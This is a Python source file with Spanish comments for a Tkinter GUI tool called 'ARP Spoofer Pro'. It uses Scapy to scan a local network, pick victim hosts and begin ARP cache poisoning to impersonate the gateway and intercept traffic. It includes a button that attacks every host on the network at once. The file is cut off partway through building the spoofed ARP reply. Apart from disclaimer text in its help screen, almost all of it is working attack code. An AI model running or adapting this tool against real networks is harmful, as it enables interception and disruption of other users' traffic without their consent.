import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from scapy.all import ARP, Ether, send, srp, conf, arping, sr, IP, ICMP
import time
import threading
import uuid
import re
import sys
import os
import socket

class ARPSpoofer:
    def __init__(self):
        # Configuración de Scapy para evitar warnings
        conf.verb = 0
        
        self.ip_puerta_enlace = "10.103.0.1"
        self.mac_atacante = self._obtener_mac_local()
        self.ataque_en_curso = False
        self.threads_ataque = []
        self.lock = threading.Lock()
        self.ips_validas = {}  # Almacena IPs y sus MACs
        self.hosts_escaneados = []  # Almacena hosts encontrados
        self.estadisticas = {
            'paquetes_enviados': 0,
            'objetivos_activos': 0,
            'tiempo_inicio': None
        }
        
        # Verificar permisos de administrador
        if not self._verificar_permisos():
            self._mostrar_dialogo_permisos()
            sys.exit(1)
        
        self.setup_gui()
        self._iniciar_actualizacion_estadisticas()

    def _obtener_mac_local(self):
        """Obtiene la dirección MAC del sistema de forma más robusta"""
        try:
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) 
                           for i in range(0, 8*6, 8)][::-1])
            return mac
        except Exception as e:
            return "00:00:00:00:00:00"

    def _verificar_permisos(self):
        """Verifica si el programa tiene permisos de administrador"""
        try:
            if os.name == 'nt':  # Windows
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:  # Linux/Mac
                return os.geteuid() == 0
        except:
            return False

    def _mostrar_dialogo_permisos(self):
        """Muestra un diálogo explicativo sobre permisos y ofrece reiniciar"""
        root = tk.Tk()
        root.withdraw()
        
        mensaje = """⚠️ PERMISOS INSUFICIENTES ⚠️

Este programa necesita permisos de administrador/root para:
• Enviar paquetes ARP personalizados
• Modificar tablas de enrutamiento de red
• Capturar tráfico de red

SOLUCIONES:

🐧 Linux/Kali:
   sudo python3 {}

🪟 Windows:
   Ejecuta la terminal como Administrador

💡 Tip: Copia el comando de arriba y pégalo en tu terminal

¿Deseas que el programa intente reiniciarse con sudo?
(Solo funciona en Linux/Mac)""".format(os.path.abspath(__file__))
        
        respuesta = messagebox.askyesno(
            "Permisos de Administrador Requeridos",
            mensaje,
            icon='warning'
        )
        
        if respuesta and os.name != 'nt':
            try:
                import subprocess
                subprocess.Popen(['sudo', 'python3', __file__])
                root.destroy()
            except Exception as e:
                messagebox.showerror(
                    "Error al Reiniciar",
                    f"No se pudo reiniciar con sudo.\n\nError: {str(e)}\n\n"
                    f"Por favor, ejecuta manualmente:\nsudo python3 {__file__}"
                )
        
        root.destroy()

    def _mostrar_info_red(self):
        """Muestra información sobre las interfaces de red disponibles"""
        try:
            import netifaces
            self.log_message("=== Interfaces de Red Disponibles ===", "info")
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    self.log_message(f"  • {iface}: {ip}", "info")
        except ImportError:
            try:
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                self.log_message(f"IP Local detectada: {local_ip}", "info")
            except:
                self.log_message("No se pudo detectar información de red", "warning")
        
        self.log_message("=" * 40, "info")

    def _detectar_red_local(self):
        """Detecta automáticamente la red local"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_local = s.getsockname()[0]
            s.close()
            
            partes = ip_local.split('.')
            red_sugerida = f"{partes[0]}.{partes[1]}.{partes[2]}.1"
            
            return ip_local, red_sugerida
        except:
            return None, None

    def _validar_ip(self, ip):
        """Valida el formato de dirección IP"""
        patron = r'^(\d{1,3}\.){3}\d{1,3}$'
        if re.match(patron, ip):
            octetos = ip.split('.')
            return all(0 <= int(octeto) <= 255 for octeto in octetos)
        return False

    def _iniciar_actualizacion_estadisticas(self):
        """Actualiza las estadísticas en tiempo real"""
        def actualizar():
            if self.ataque_en_curso and self.estadisticas['tiempo_inicio']:
                tiempo_transcurrido = int(time.time() - self.estadisticas['tiempo_inicio'])
                minutos = tiempo_transcurrido // 60
                segundos = tiempo_transcurrido % 60
                
                self.label_paquetes.config(text=f"{self.estadisticas['paquetes_enviados']}")
                self.label_objetivos.config(text=f"{self.estadisticas['objetivos_activos']}")
                self.label_tiempo.config(text=f"{minutos:02d}:{segundos:02d}")
            
            self.ventana.after(1000, actualizar)
        
        self.ventana.after(1000, actualizar)

    def setup_gui(self):
        self.ventana = tk.Tk()
        self.ventana.title("ARP Spoofer Pro - Control de Red Avanzado")
        self.ventana.geometry("900x750")
        self.ventana.configure(bg='#1a1a2e')
        
        # Configurar cierre de ventana
        self.ventana.protocol("WM_DELETE_WINDOW", self._on_closing)

        # Estilos personalizados
        style = ttk.Style()
        style.theme_use('clam')
        
        # Colores personalizados
        style.configure("TFrame", background='#1a1a2e')
        style.configure("TLabelframe", background='#1a1a2e', foreground='#00d9ff', bordercolor='#00d9ff')
        style.configure("TLabelframe.Label", background='#1a1a2e', foreground='#00d9ff', font=('Helvetica', 11, 'bold'))
        style.configure("TLabel", background='#1a1a2e', foreground='#ffffff', font=('Helvetica', 10))
        style.configure("TButton", background='#0f3460', foreground='#ffffff', font=('Helvetica', 10, 'bold'), borderwidth=0)
        style.map("TButton", background=[('active', '#16213e')])
        
        # Estilos especiales para botones
        style.configure("Success.TButton", background='#00c853', foreground='#ffffff')
        style.map("Success.TButton", background=[('active', '#00e676')])
        
        style.configure("Danger.TButton", background='#d32f2f', foreground='#ffffff')
        style.map("Danger.TButton", background=[('active', '#f44336')])
        
        style.configure("Warning.TButton", background='#ff6f00', foreground='#ffffff')
        style.map("Warning.TButton", background=[('active', '#ff8f00')])

        # Frame principal con scroll
        main_canvas = tk.Canvas(self.ventana, bg='#1a1a2e', highlightthickness=0)
        scrollbar = ttk.Scrollbar(self.ventana, orient="vertical", command=main_canvas.yview)
        main_frame = ttk.Frame(main_canvas)

        main_frame.bind(
            "<Configure>",
            lambda e: main_canvas.configure(scrollregion=main_canvas.bbox("all"))
        )

        main_canvas.create_window((0, 0), window=main_frame, anchor="nw")
        main_canvas.configure(yscrollcommand=scrollbar.set)

        main_canvas.pack(side="left", fill="both", expand=True, padx=10, pady=10)
        scrollbar.pack(side="right", fill="y")

        # === HEADER ===
        header_frame = tk.Frame(main_frame, bg='#0f3460', relief=tk.RAISED, borderwidth=2)
        header_frame.pack(fill=tk.X, pady=(0, 15))
        
        title_label = tk.Label(
            header_frame,
            text="🛡️ ARP SPOOFER PRO",
            font=('Helvetica', 20, 'bold'),
            bg='#0f3460',
            fg='#00d9ff',
            pady=10
        )
        title_label.pack()
        
        subtitle_label = tk.Label(
            header_frame,
            text="Sistema Avanzado de Control de Red",
            font=('Helvetica', 10),
            bg='#0f3460',
            fg='#ffffff'
        )
        subtitle_label.pack(pady=(0, 10))

        # === ESTADÍSTICAS EN TIEMPO REAL ===
        stats_frame = ttk.LabelFrame(main_frame, text="📊 Estadísticas en Tiempo Real", padding=15)
        stats_frame.pack(fill=tk.X, pady=(0, 10))
        
        stats_inner = tk.Frame(stats_frame, bg='#1a1a2e')
        stats_inner.pack(fill=tk.X)
        
        # Paquetes enviados
        stat1 = tk.Frame(stats_inner, bg='#16213e', relief=tk.RAISED, borderwidth=1)
        stat1.pack(side=tk.LEFT, expand=True, fill=tk.BOTH, padx=5, pady=5)
        tk.Label(stat1, text="Paquetes Enviados", bg='#16213e', fg='#00d9ff', font=('Helvetica', 9)).pack(pady=(5, 0))
        self.label_paquetes = tk.Label(stat1, text="0", bg='#16213e', fg='#00ff00', font=('Helvetica', 16, 'bold'))
        self.label_paquetes.pack(pady=5)
        
        # Objetivos activos
        stat2 = tk.Frame(stats_inner, bg='#16213e', relief=tk.RAISED, borderwidth=1)
        stat2.pack(side=tk.LEFT, expand=True, fill=tk.BOTH, padx=5, pady=5)
        tk.Label(stat2, text="Objetivos Activos", bg='#16213e', fg='#00d9ff', font=('Helvetica', 9)).pack(pady=(5, 0))
        self.label_objetivos = tk.Label(stat2, text="0", bg='#16213e', fg='#ffeb3b', font=('Helvetica', 16, 'bold'))
        self.label_objetivos.pack(pady=5)
        
        # Tiempo transcurrido
        stat3 = tk.Frame(stats_inner, bg='#16213e', relief=tk.RAISED, borderwidth=1)
        stat3.pack(side=tk.LEFT, expand=True, fill=tk.BOTH, padx=5, pady=5)
        tk.Label(stat3, text="Tiempo Transcurrido", bg='#16213e', fg='#00d9ff', font=('Helvetica', 9)).pack(pady=(5, 0))
        self.label_tiempo = tk.Label(stat3, text="00:00", bg='#16213e', fg='#ff9800', font=('Helvetica', 16, 'bold'))
        self.label_tiempo.pack(pady=5)

        # === CONFIGURACIÓN ===
        config_frame = ttk.LabelFrame(main_frame, text="⚙️ Configuración de Red", padding=15)
        config_frame.pack(fill=tk.X, pady=(0, 10))

        config_grid = tk.Frame(config_frame, bg='#1a1a2e')
        config_grid.pack(fill=tk.X)

        tk.Label(config_grid, text="Gateway:", bg='#1a1a2e', fg='#ffffff', font=('Helvetica', 10)).grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.entrada_gateway = tk.Entry(config_grid, width=18, font=('Consolas', 10), bg='#16213e', fg='#ffffff', insertbackground='#00d9ff', relief=tk.FLAT, borderwidth=2)
        self.entrada_gateway.insert(0, self.ip_puerta_enlace)
        self.entrada_gateway.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)

        tk.Label(config_grid, text="MAC Atacante:", bg='#1a1a2e', fg='#ffffff', font=('Helvetica', 10)).grid(row=0, column=2, sticky=tk.W, padx=5, pady=5)
        self.label_mac = tk.Label(config_grid, text=self.mac_atacante, font=('Consolas', 9), bg='#16213e', fg='#00ff00', relief=tk.FLAT, padx=10, pady=5)
        self.label_mac.grid(row=0, column=3, sticky=tk.W, padx=5, pady=5)

        # === HOSTS ENCONTRADOS (NUEVO) ===
        hosts_frame = ttk.LabelFrame(main_frame, text="🌐 Hosts Detectados en la Red", padding=15)
        hosts_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Frame para el Treeview y scrollbar
        tree_frame = tk.Frame(hosts_frame, bg='#1a1a2e')
        tree_frame.pack(fill=tk.BOTH, expand=True)
        
        # Crear Treeview para mostrar hosts
        tree_scroll = ttk.Scrollbar(tree_frame)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.hosts_tree = ttk.Treeview(
            tree_frame,
            columns=("IP", "MAC", "Estado"),
            show="headings",
            height=6,
            yscrollcommand=tree_scroll.set
        )
        tree_scroll.config(command=self.hosts_tree.yview)
        
        # Configurar columnas
        self.hosts_tree.heading("IP", text="Dirección IP")
        self.hosts_tree.heading("MAC", text="Dirección MAC")
        self.hosts_tree.heading("Estado", text="Estado")
        
        self.hosts_tree.column("IP", width=150, anchor=tk.CENTER)
        self.hosts_tree.column("MAC", width=180, anchor=tk.CENTER)
        self.hosts_tree.column("Estado", width=120, anchor=tk.CENTER)
        
        self.hosts_tree.pack(fill=tk.BOTH, expand=True)
        
        # Botones de selección de hosts
        hosts_btn_frame = tk.Frame(hosts_frame, bg='#1a1a2e')
        hosts_btn_frame.pack(fill=tk.X, pady=(10, 0))
        
        ttk.Button(
            hosts_btn_frame,
            text="✓ Seleccionar Todos",
            command=self.seleccionar_todos_hosts,
            style="Success.TButton"
        ).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(
            hosts_btn_frame,
            text="✗ Deseleccionar Todos",
            command=self.deseleccionar_todos_hosts
        ).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(
            hosts_btn_frame,
            text="➤ Usar Seleccionados como Objetivos",
            command=self.usar_hosts_seleccionados,
            style="Warning.TButton"
        ).pack(side=tk.LEFT, padx=5)

        # === OBJETIVOS ===
        input_frame = ttk.LabelFrame(main_frame, text="🎯 IPs Objetivo", padding=15)
        input_frame.pack(fill=tk.X, pady=(0, 10))

        tk.Label(input_frame, text="Ingresa las IPs objetivo (separadas por coma o líneas):", bg='#1a1a2e', fg='#ffffff').pack(anchor=tk.W, padx=5, pady=5)
        
        self.entrada_ip = scrolledtext.ScrolledText(
            input_frame,
            width=70,
            height=3,
            font=('Consolas', 10),
            bg='#16213e',
            fg='#ffffff',
            insertbackground='#00d9ff',
            relief=tk.FLAT,
            borderwidth=2
        )
        self.entrada_ip.pack(fill=tk.X, padx=5, pady=5)

        # === BOTONES DE CONTROL ===
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=10)

        # Primera fila de botones
        btn_row1 = tk.Frame(button_frame, bg='#1a1a2e')
        btn_row1.pack(fill=tk.X, pady=5)

        self.boton_escanear = ttk.Button(
            btn_row1,
            text="🔍 Escanear Red",
            command=self.escanear_red  # método reemplazado por la versión mejorada abajo
        )
        self.boton_escanear.pack(side=tk.LEFT, padx=5, ipadx=10, ipady=5)

        # Nuevo: botón para ping sweep independiente
        self.boton_ping = ttk.Button(
            btn_row1,
            text="🔁 Ping Sweep",
            command=self.ping_sweep
        )
        self.boton_ping.pack(side=tk.LEFT, padx=5, ipadx=10, ipady=5)

        self.boton_validar = ttk.Button(
            btn_row1,
            text="✓ Validar IPs",
            command=self.validar_ips
        )
        self.boton_validar.pack(side=tk.LEFT, padx=5, ipadx=10, ipady=5)

        self.boton_iniciar = ttk.Button(
            btn_row1,
            text="▶ Iniciar Ataque",
            command=self.iniciar_spoofing,
            style="Success.TButton"
        )
        self.boton_iniciar.pack(side=tk.LEFT, padx=5, ipadx=10, ipady=5)
        self.boton_iniciar.config(state='disabled')

        self.boton_detener = ttk.Button(
            btn_row1,
            text="⏹ Detener Ataque",
            command=self.detener_spoofing,
            style="Danger.TButton"
        )
        self.boton_detener.pack(side=tk.LEFT, padx=5, ipadx=10, ipady=5)
        self.boton_detener.config(state='disabled')

        # Segunda fila de botones
        btn_row2 = tk.Frame(button_frame, bg='#1a1a2e')
        btn_row2.pack(fill=tk.X, pady=5)

        self.boton_atacar_todos = ttk.Button(
            btn_row2,
            text="⚡ Atacar TODOS los Hosts",
            command=self.atacar_todos_hosts,
            style="Warning.TButton"
        )
        self.boton_atacar_todos.pack(side=tk.LEFT, padx=5, ipadx=10, ipady=5)
        self.boton_atacar_todos.config(state='disabled')

        self.boton_limpiar = ttk.Button(
            btn_row2,
            text="🗑 Limpiar Log",
            command=self.limpiar_log
        )
        self.boton_limpiar.pack(side=tk.LEFT, padx=5, ipadx=10, ipady=5)

        ttk.Button(
            btn_row2,
            text="ℹ️ Ayuda",
            command=self.mostrar_ayuda
        ).pack(side=tk.LEFT, padx=5, ipadx=10, ipady=5)

        # === LOG ===
        log_frame = ttk.LabelFrame(main_frame, text="📝 Registro de Actividad", padding=15)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        self.widget_salida = scrolledtext.ScrolledText(
            log_frame,
            width=80,
            height=15,
            font=('Consolas', 9),
            bg='#0d0d0d',
            fg='#00ff00',
            wrap=tk.WORD,
            insertbackground='#00d9ff',
            relief=tk.FLAT,
            borderwidth=2
        )
        self.widget_salida.pack(fill=tk.BOTH, expand=True)

        # === BARRA DE ESTADO ===
        status_frame = tk.Frame(self.ventana, bg='#0f3460', relief=tk.SUNKEN, borderwidth=2)
        status_frame.pack(fill=tk.X, side=tk.BOTTOM)
        
        self.status_var = tk.StringVar(value="🟢 Estado: Listo para operar")
        self.status_bar = tk.Label(
            status_frame,
            textvariable=self.status_var,
            bg='#0f3460',
            fg='#ffffff',
            anchor=tk.W,
            font=('Helvetica', 9),
            padx=10,
            pady=5
        )
        self.status_bar.pack(fill=tk.X)

        # Mensaje inicial
        self.log_message("="*80, "info")
        self.log_message("🛡️  ARP SPOOFER PRO - Sistema Iniciado", "success")
        self.log_message("="*80, "info")
        self.log_message(f"✓ MAC del atacante: {self.mac_atacante}", "info")
        self.log_message(f"✓ Gateway configurado: {self.ip_puerta_enlace}", "info")
        self._mostrar_info_red()

    # -------------------------
    # Métodos de gestión hosts
    # -------------------------
    def seleccionar_todos_hosts(self):
        """Selecciona todos los hosts del Treeview"""
        for item in self.hosts_tree.get_children():
            self.hosts_tree.selection_add(item)
        self.log_message(f"Seleccionados {len(self.hosts_tree.get_children())} hosts", "info")

    def deseleccionar_todos_hosts(self):
        """Deselecciona todos los hosts del Treeview"""
        self.hosts_tree.selection_remove(*self.hosts_tree.get_children())
        self.log_message("Hosts deseleccionados", "info")

    def usar_hosts_seleccionados(self):
        """Usa los hosts seleccionados como objetivos"""
        seleccionados = self.hosts_tree.selection()
        
        if not seleccionados:
            messagebox.showwarning("Advertencia", "No hay hosts seleccionados.")
            return
        
        ips_texto = ""
        for item in seleccionados:
            valores = self.hosts_tree.item(item, 'values')
            ips_texto += f"{valores[0]}, "
        
        self.entrada_ip.delete("1.0", tk.END)
        self.entrada_ip.insert("1.0", ips_texto.rstrip(", "))
        
        self.log_message(f"✓ {len(seleccionados)} hosts agregados como objetivos", "success")
        messagebox.showinfo("Éxito", f"{len(seleccionados)} hosts agregados a la lista de objetivos.")

    # -------------------------
    # Escaneo mejorado (reemplaza al original)
    # -------------------------
    def escanear_red(self):
        """
        Escaneo mejorado: usa arping para detección ARP; si detecta pocos hosts
        hace fallback a un ping sweep (ICMP). Actualiza la UI con los resultados.
        """
        self.log_message("🔍 Iniciando escaneo de red (mejorado)...", "info")

        # Detectar IP local / interfaz tentativa
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_local = s.getsockname()[0]
            s.close()
            self.log_message(f"✓ IP local inferida: {ip_local}", "info")
        except Exception:
            ip_local = None

        # Preguntar rango a escanear
        rango = tk.simpledialog.askstring(
            "Escanear Red",
            "Ingresa el rango de red a escanear\n(ejemplo: 10.103.0.0/24 o 192.168.1.0/24):",
            initialvalue="10.103.0.0/24"
        )
        if not rango:
            return

        # Intentar seleccionar interfaz asociada a ip_local (si netifaces disponible)
        try:
            import netifaces
            interfaz_detectada = None
            if ip_local:
                for iface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        if addrs[netifaces.AF_INET][0].get('addr') == ip_local:
                            interfaz_detectada = iface
                            break
            if interfaz_detectada:
                conf.iface = interfaz_detectada
                self.log_message(f"✓ Interfaz seleccionada para escaneo: {interfaz_detectada} ({ip_local})", "info")
            else:
                self.log_message(f"⚠️ No se detectó interfaz automática; usando iface por defecto ({conf.iface})", "warning")
        except ImportError:
            # No es crítico; siguimos con la heurística de socket
            if ip_local:
                self.log_message(f"⚠️ netifaces no instalado; intentando usar IP local {ip_local} y iface por defecto ({conf.iface})", "warning")
            else:
                self.log_message("⚠️ No se pudo inferir interfaz; usando iface por defecto", "warning")

        self.boton_escanear.config(state='disabled')
        self.status_var.set("🔍 Escaneando red...")
        self.log_message(f"🌐 Escaneando rango: {rango}", "info")

        def tarea():
            hosts_encontrados = []
            try:
                # 1) Intentar ARP broadcast con arping (más confiable para ARP)
                try:
                    answered, unanswered = arping(rango, timeout=3, verbose=0)
                    for sent, recv in answered:
                        ip = recv.psrc
                        mac = recv.hwsrc
                        hosts_encontrados.append((ip, mac))
                except Exception as e:
                    self.log_message(f"⚠️ arping falló: {str(e)} — continuando con srp/sr", "warning")

                # 2) Si fueron pocos hosts, intentar fallback ICMP ping sweep
                if len(hosts_encontrados) < 3:
                    self.log_message("⚠️ Pocos hosts detectados por ARP. Intentando ICMP ping sweep como fallback...", "warning")
                    try:
                        answered_icmp, unanswered_icmp = sr(IP(dst=rango)/ICMP(), timeout=2, verbose=0)
                        for snd, rcv in answered_icmp:
                            ip = rcv.src
                            # Intentar obtener la MAC localmente (si es posible)
                            mac = self.obtener_mac(ip) or "??:??:??:??:??:??"
                            if (ip, mac) not in hosts_encontrados:
                                hosts_encontrados.append((ip, mac))
                    except Exception as e:
                        self.log_message(f"⚠️ Ping sweep falló: {str(e)}", "warning")

                # Guardar hosts encontrados
                self.hosts_escaneados = hosts_encontrados

                # Actualizar Treeview en hilo principal
                def actualizar_tree():
                    for item in self.hosts_tree.get_children():
                        self.hosts_tree.delete(item)
                    for ip, mac in hosts_encontrados:
                        estado = "🟢 Activo"
                        self.hosts_tree.insert("", "end", values=(ip, mac, estado))
                    if hosts_encontrados:
                        self.boton_atacar_todos.config(state='normal')
                self.ventana.after(0, actualizar_tree)

                # Mensajes al log
                if hosts_encontrados:
                    self.log_message("="*80, "success")
                    self.log_message(f"✓ ESCANEO COMPLETADO - {len(hosts_encontrados)} hosts encontrados", "success")
                    self.log_message("="*80, "success")
                    for ip, mac in hosts_encontrados:
                        self.log_message(f"  📡 {ip} -> {mac}", "info")
                    # Pregunta para agregar todos como objetivos (opcional)
                    def preguntar():
                        respuesta = messagebox.askyesno(
                            "Hosts Encontrados",
                            f"✓ Se encontraron {len(hosts_encontrados)} hosts activos.\n\n"
                            "¿Deseas agregarlos TODOS como objetivos?\n"
                            "(También puedes seleccionar manualmente desde la tabla)"
                        )
                        if respuesta:
                            ips_texto = ", ".join(ip for ip, _ in hosts_encontrados)
                            self.entrada_ip.delete("1.0", tk.END)
                            self.entrada_ip.insert("1.0", ips_texto)
                            self.log_message("✓ Todos los hosts agregados como objetivos", "success")
                    self.ventana.after(0, preguntar)
                else:
                    self.log_message("❌ No se encontraron hosts activos en el rango", "warning")
                    self.ventana.after(0, lambda: messagebox.showinfo(
                        "Sin Resultados",
                        "No se encontraron hosts activos en el rango.\n\n"
                        "Posibles causas:\n"
                        "• Rango de red incorrecto\n"
                        "• Firewall bloqueando las respuestas\n"
                        "• Segmentación/VLAN"
                    ))
            except Exception as e:
                self.log_message(f"❌ Error durante el escaneo mejorado: {str(e)}", "error")
                self.ventana.after(0, lambda: messagebox.showerror(
                    "Error de Escaneo",
                    f"No se pudo completar el escaneo.\n\nError: {str(e)}"
                ))
            finally:
                self.ventana.after(0, lambda: self.boton_escanear.config(state='normal'))
                self.ventana.after(0, lambda: self.status_var.set("🟢 Estado: Escaneo completado"))

        threading.Thread(target=tarea, daemon=True).start()

    # -------------------------
    # Ping sweep como función separada y segura
    # -------------------------
    def ping_sweep(self):
        """
        Ejecuta un ping sweep ICMP sobre un rango (seguro, no intrusivo).
        Actualiza el log con hosts vivos.
        """
        rango = tk.simpledialog.askstring(
            "Ping Sweep",
            "Ingresa el rango para Ping Sweep (ej. 10.103.0.0/24):",
            initialvalue="10.103.0.0/24"
        )
        if not rango:
            return

        self.log_message(f"🔁 Iniciando ping sweep en {rango}", "info")
        self.boton_ping.config(state='disabled')
        self.status_var.set("🔁 Ejecutando Ping Sweep...")

        def tarea():
            vivos = []
            try:
                answered, unanswered = sr(IP(dst=rango)/ICMP(), timeout=2, verbose=0)
                for snd, rcv in answered:
                    ip = rcv.src
                    mac = self.obtener_mac(ip) or "??:??:??:??:??:??"
                    vivos.append((ip, mac))
                if vivos:
                    self.log_message("="*40, "success")
                    self.log_message(f"✓ Ping Sweep completado - {len(vivos)} hosts vivos", "success")
                    self.log_message("="*40, "success")
                    for ip, mac in vivos:
                        self.log_message(f"  📶 {ip} -> {mac}", "info")
                else:
                    self.log_message("⚠️ Ping Sweep no encontró hosts vivos", "warning")
            except Exception as e:
                self.log_message(f"❌ Error en ping sweep: {str(e)}", "error")
            finally:
                self.boton_ping.config(state='normal')
                self.status_var.set("🟢 Estado: Ping Sweep finalizado")

        threading.Thread(target=tarea, daemon=True).start()

    # -------------------------
    # Resto del código original (mantengo funciones de validación, spoofing, restaurar, etc.)
    # -------------------------
    def mostrar_ayuda(self):
        """Muestra ventana de ayuda"""
        ayuda = """
🛡️ ARP SPOOFER PRO - GUÍA DE USO

1️⃣ ESCANEAR RED:
   • Detecta todos los dispositivos en tu red local
   • Muestra IPs y direcciones MAC
   • Permite seleccionar objetivos

2️⃣ VALIDAR IPs:
   • Verifica que las IPs objetivo sean válidas
   • Obtiene las direcciones MAC necesarias
   • Habilita el botón de ataque

3️⃣ INICIAR ATAQUE:
   • Comienza el ARP Spoofing en objetivos seleccionados
   • Intercepta el tráfico de red
   • Muestra estadísticas en tiempo real

4️⃣ ATACAR TODOS:
   • ⚠️ PELIGROSO: Ataca todos los hosts simultáneamente
   • Requiere doble confirmación
   • Solo para uso en entornos controlados

⚠️ ADVERTENCIAS LEGALES:
• Solo usa esta herramienta en redes propias
• Obtén autorización explícita por escrito
• El uso no autorizado es ILEGAL
• Úsala solo con fines educativos

📊 ESTADÍSTICAS:
• Paquetes Enviados: Total de paquetes ARP maliciosos
• Objetivos Activos: Número de víctimas simultáneas
• Tiempo: Duración del ataque actual

🔒 REQUISITOS:
• Permisos de administrador/root
• Python 3.x con Scapy instalado
• Interfaz de red en modo promiscuo
        """
        
        ventana_ayuda = tk.Toplevel(self.ventana)
        ventana_ayuda.title("Ayuda - ARP Spoofer Pro")
        ventana_ayuda.geometry("600x500")
        ventana_ayuda.configure(bg='#1a1a2e')
        
        text_ayuda = scrolledtext.ScrolledText(
            ventana_ayuda,
            font=('Consolas', 9),
            bg='#0d0d0d',
            fg='#00ff00',
            wrap=tk.WORD,
            padx=10,
            pady=10
        )
        text_ayuda.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        text_ayuda.insert('1.0', ayuda)
        text_ayuda.config(state='disabled')
        
        ttk.Button(
            ventana_ayuda,
            text="Cerrar",
            command=ventana_ayuda.destroy
        ).pack(pady=10)

    def obtener_mac(self, ip, timeout=3, reintentos=2):
        """Obtiene la dirección MAC de una IP con reintentos"""
        for intento in range(reintentos):
            try:
                solicitud_arp = ARP(pdst=ip)
                ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                paquete = ether / solicitud_arp
                
                resultado = srp(paquete, timeout=timeout, verbose=0, retry=2, inter=0.1)[0]
                
                if resultado:
                    return resultado[0][1].hwsrc
                
            except PermissionError:
                self.log_message("⚠️ ERROR DE PERMISOS: Se necesita ejecutar como root/administrador", "error")
                self.log_message(f"Ejecuta: sudo python3 {os.path.abspath(__file__)}", "warning")
                messagebox.showerror(
                    "Error de Permisos",
                    "Se detectó un error de permisos.\n\n"
                    f"Ejecuta en terminal:\nsudo python3 {os.path.abspath(__file__)}"
                )
                return None
            except Exception as e:
                if intento == reintentos - 1:
                    self.log_message(f"Error obteniendo MAC de {ip}: {str(e)}", "error")
        return None

    def validar_ips(self):
        """Valida las IPs ingresadas y obtiene sus MACs"""
        texto = self.entrada_ip.get("1.0", tk.END).strip()
        
        # Separar por comas y/o líneas
        ips = re.split(r'[,\n]+', texto)
        ips = [ip.strip() for ip in ips if ip.strip()]
        
        if not ips:
            messagebox.showwarning("Advertencia", "No se ingresaron direcciones IP.")
            return

        self.log_message("="*80, "info")
        self.log_message("🔍 Validando direcciones IP...", "info")
        self.ips_validas.clear()
        
        # Validar gateway
        gateway = self.entrada_gateway.get().strip()
        if not self._validar_ip(gateway):
            messagebox.showerror("Error", f"Gateway inválido: {gateway}")
            return
        
        self.ip_puerta_enlace = gateway
        self.log_message(f"✓ Gateway validado: {gateway}", "success")
        
        # Validar formato de IPs
        ips_formato_valido = []
        for ip in ips:
            if self._validar_ip(ip):
                ips_formato_valido.append(ip)
            else:
                self.log_message(f"❌ IP con formato inválido: {ip}", "error")
        
        if not ips_formato_valido:
            messagebox.showerror("Error", "No hay IPs válidas para validar.")
            return
        
        self.status_var.set("🔍 Validando IPs...")
        self.boton_validar.config(state='disabled')
        
        # Obtener MACs en thread separado
        def validar():
            try:
                for idx, ip in enumerate(ips_formato_valido, 1):
                    self.log_message(f"[{idx}/{len(ips_formato_valido)}] Obteniendo MAC de {ip}...", "info")
                    mac = self.obtener_mac(ip)
                    
                    if mac:
                        self.ips_validas[ip] = mac
                        self.log_message(f"  ✓ {ip} -> {mac}", "success")
                    else:
                        self.log_message(f"  ✗ No se pudo obtener MAC de {ip}", "error")
                
                # Actualizar UI
                def actualizar_ui():
                    if self.ips_validas:
                        self.log_message("="*80, "success")
                        self.log_message(
                            f"✓ Validación completada: {len(self.ips_validas)}/{len(ips_formato_valido)} IPs válidas",
                            "success"
                        )
                        self.log_message("="*80, "success")
                        self.boton_iniciar.config(state='normal')
                        self.status_var.set(f"🟢 {len(self.ips_validas)} objetivos listos para ataque")
                    else:
                        messagebox.showerror("Error", "No se pudo validar ninguna IP objetivo.")
                        self.boton_iniciar.config(state='disabled')
                        self.status_var.set("🔴 Sin objetivos válidos")
                    
                    self.boton_validar.config(state='normal')
                
                self.ventana.after(0, actualizar_ui)
                
            except Exception as e:
                self.log_message(f"❌ Error en validación: {str(e)}", "error")
                self.ventana.after(0, lambda: self.boton_validar.config(state='normal'))
        
        thread = threading.Thread(target=validar, daemon=True)
        thread.start()

    def log_message(self, message, level="info"):
        """Registra mensajes con colores y timestamp"""
        colors = {
            "info": "#00bfff",
            "warning": "#ffa500",
            "error": "#ff4444",
            "success": "#00ff00"
        }
        
        def _log():
            timestamp = time.strftime("%H:%M:%S")
            self.widget_salida.tag_config(level, foreground=colors.get(level, "#ffffff"))
            self.widget_salida.insert(tk.END, f"[{timestamp}] {message}\n", level)
            self.widget_salida.see(tk.END)
        
        # Ejecutar en el thread principal de Tkinter
        if threading.current_thread() == threading.main_thread():
            _log()
        else:
            self.ventana.after(0, _log)

    # -------------------------
    # Funciones relacionadas con spoofing (mantengo igual)
    # -------------------------
    def spoofing_arp(self, ip_objetivo, mac_objetivo):
        """Realiza el spoofing ARP para un objetivo específico"""
        mac_puerta = self.obtener_mac(self.ip_puerta_enlace)
        if not mac_puerta:
            self.log_message(f"❌ No se pudo obtener MAC del gateway para {ip_objetivo}", "error")
            return

        self.log_message(f"⚡ Iniciando spoofing en {ip_objetivo}", "warning")
        contador = 0
        
        try:
            while self.ataque_en_curso:
                try:
                    # Envenenar caché del objetivo (hacerse pasar por gateway)
                    paquete_objetivo = ARP(
                        op=2,  # is-at (respuesta)
